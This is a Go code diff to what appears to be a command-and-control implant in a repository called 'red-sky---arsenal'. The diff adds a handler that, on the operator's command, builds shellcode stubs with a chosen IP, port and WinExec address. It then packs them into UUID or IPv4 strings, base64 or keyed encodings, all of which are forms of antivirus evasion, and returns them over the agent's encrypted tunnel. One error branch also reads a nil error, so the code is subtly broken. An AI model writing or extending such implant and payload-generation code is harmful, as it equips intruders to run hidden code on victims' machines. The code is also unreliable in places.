@@ -22,6 +22,7 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strings"
 	"sync"
 	"time"
 
@@ -36,6 +37,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
 	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
+	"github.com/sk666G/red-sky---arsenal/internal/shellcode"
 	"github.com/sk666G/red-sky---arsenal/internal/socialgo"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
 	"github.com/sk666G/red-sky---arsenal/internal/webgo"
@@ -305,6 +307,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runAdEnum(conn, sess, ae)
+		case proto.TypeShellcodeStart:
+			var sc proto.ShellcodeStart
+			if err := json.Unmarshal(env.Payload, &sc); err != nil {
+				log.Printf("[shellcode] unmarshal: %v", err)
+				continue
+			}
+			go runShellcode(conn, sess, sc)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1850,4 +1859,69 @@ func runAdWrite(c *adgo.LDAPConn, ae proto.AdEnumStart, sendMsg func(string, boo
 		return
 	}
 	sendMsg("ok: "+ae.WriteDriver, true, false)
+}
+
+// runShellcode generates a shellcode stub, optionally encoded.
+func runShellcode(conn net.Conn, sess *crypto.Session, sc proto.ShellcodeStart) {
+	send := func(d proto.ShellcodeData) {
+		sendTunnelAck(conn, sess, proto.TypeShellcodeData, d)
+	}
+
+	opts := shellcode.BuildOptions{
+		Arch:        shellcode.Arch(sc.Arch),
+		Kind:        sc.Kind,
+		IP:          sc.IP,
+		Port:        sc.Port,
+		WinExecAddr: sc.WinExec,
+	}
+	stub, err := shellcode.Build(opts)
+	if err != nil {
+		send(proto.ShellcodeData{SessionID: sc.SessionID, Notes: "build error: " + err.Error(), Done: true})
+		return
+	}
+
+	d := proto.ShellcodeData{
+		SessionID: sc.SessionID,
+		Label:     stub.Label,
+		Raw:       shellcode.Hex(stub.Bytes),
+		Size:      len(stub.Bytes),
+		Notes:     stub.Notes,
+		CArray:    shellcode.CArray("sc", stub.Bytes),
+	}
+
+	// optional encoding
+	switch sc.Encode {
+	case "", "none":
+		d.Encoded = d.Raw
+	case "uuid":
+		d.Encoded = strings.Join(shellcode.UUIDStrings(stub.Bytes), "\n")
+		d.EncodeKey = "uuid-pack"
+	case "ipv4":
+		d.Encoded = strings.Join(shellcode.IPv4Strings(stub.Bytes), "\n")
+		d.EncodeKey = "ipv4-pack"
+	default:
+		enc, _, err := shellcode.Encode(sc.Encode, sc.Key, stub.Bytes)
+		if err != nil {
+			send(proto.ShellcodeData{SessionID: sc.SessionID, Notes: "encode error: " + err.Error(), Done: true})
+			return
+		}
+		// base64 output is text, everything else is hex
+		if sc.Encode == "base64" || sc.Encode == "b64" {
+			d.Encoded = string(enc)
+		} else {
+			d.Encoded = shellcode.Hex(enc)
+		}
+		_, encErr := shellcode.EncoderByName(sc.Encode, sc.Key)
+		if encErr != nil {
+			send(proto.ShellcodeData{SessionID: sc.SessionID, Notes: "encoder: " + err.Error(), Done: true})
+			return
+		}
+		// the key text is embedded above via the encoder's Key() during encode
+		// (shellcode.Encode drops it) — re-fetch by calling the encoder.
+		e2, _ := shellcode.EncoderByName(sc.Encode, sc.Key)
+		d.EncodeKey = e2.Key()
+	}
+
+	send(d)
+	send(proto.ShellcodeData{SessionID: sc.SessionID, Done: true})
 }
